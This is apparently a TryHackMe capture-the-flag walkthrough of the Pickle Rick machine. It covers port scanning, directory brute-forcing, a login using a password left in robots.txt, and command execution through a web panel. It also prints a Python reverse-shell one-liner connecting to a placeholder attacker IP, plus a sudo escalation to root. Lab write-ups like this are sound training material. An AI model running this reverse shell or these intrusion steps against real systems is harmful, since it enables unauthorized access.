# Pickle Rick - TryHackMe Walkthrough
**By Curulo**

---

## 📝 Description
This is a walkthrough for the Pickle Rick CTF machine on TryHackMe. The objective is to exploit a web server to find three hidden ingredients and help Rick revert to his human form.

---

## 🛠️ Tools Used
-   **Nmap**: Port scanning and service enumeration.
-   **Gobuster**: Directory bruteforcing.
-   **Python3**: Establishing a reverse shell.

---

## 🔍 Enumeration

### 1. Initial Scan
We start by running an `nmap` scan to identify open ports:

```bash
nmap -sV -sC -T4 -p- -vv -oN scan_report picklerick.thm
```

**Results:**
- **22/tcp (SSH)**: Open.
- **80/tcp (HTTP)**: Open, running a web server.

### 2. Web Analysis
Upon visiting the website, we inspect the source code. A comment reveals a username.

**User Found:** `R1ckRul3s`

### 3. Directory Enumeration
Using Gobuster to discover hidden directories:

```bash
gobuster dir -u http://picklerick.thm -w /usr/share/wordlists/dirb/common.txt -x php,js,html,txt
```

**Findings:**
- `/login.php`: Login page.
- `/portal.php`: Portal page.
- `/robots.txt`: Contains a suspicious string.

Inspecting `robots.txt` reveals a text string that is likely a password.

---

## 🚀 Exploitation

### 1. Accessing the Panel
Using the username `R1ckRul3s` and the password found in `robots.txt`, we successfully log in to `/login.php`. This grants access to a command execution panel.

### 2. First Ingredient
We attempt to list files using `ls` and identifying a suspicious file. However, the `cat` command is disabled.

**Bypass:**
We can use alternative commands to read the file, such as `less`.

```bash
less Sup3rS3cretPickl3Ingred.txt
```

**Ingredient 1:** `[REDACTED]`

### 3. Reverse Shell
We find a `clue.txt` file suggesting we need to explore the file system further. To do this efficiently, we establish a reverse shell.

First, we verify if Python 3 is installed:
```bash
which python3
```

We then execute a Python one-liner to connect back to our listener:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

*Note: Ensure a netcat listener is running on your machine: `nc -lvnp 1234`*

We obtain a shell as the `www-data` user.

---

## 🕵️‍♂️ Post-Exploitation

### 4. Second Ingredient
Navigating to the `/home/rick/` directory reveals the second ingredient file. We can read it using standard commands.

**Ingredient 2:** `[REDACTED]`

---

## 👑 Privilege Escalation

### 5. Third Ingredient
We check for sudo privileges for the current user:

```bash
sudo -l
```

**Result:**
`(root) NOPASSWD: ALL`

The configuration allows the user to execute any command as root without a password. We escalate privileges:

```bash
sudo bash
```

Now with root access, we navigate to `/root/` to retrieve the final ingredient.

**Ingredient 3:** `[REDACTED]`

---

## 🏆 Conclusion
We have successfully enumerated the target, bypassed authentication, established a shell, and escalated privileges to root to retrieve all three ingredients.
